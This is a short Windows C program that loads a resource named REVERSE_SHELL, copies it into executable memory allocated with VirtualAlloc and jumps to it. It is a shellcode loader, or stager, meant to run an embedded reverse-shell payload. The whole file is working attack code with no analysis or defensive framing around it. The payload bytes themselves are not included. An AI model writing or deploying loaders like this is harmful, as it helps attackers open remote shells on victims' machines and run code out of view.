#include <windows.h>
#include "resource.h"

int main(int argc, char** argv) {
	HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(IDR_REVERSE_SHELL1), L"REVERSE_SHELL");

	if (resource) {
		DWORD resourceSize = SizeofResource(NULL, resource);
		HGLOBAL resourceData = LoadResource(NULL, resource);
		
		void* exec = VirtualAlloc(0, resourceSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		
		if (exec && resourceData) {
			memcpy(exec, resourceData, resourceSize);
			((void(*)())exec)();
		}
	}

	return 0;
}
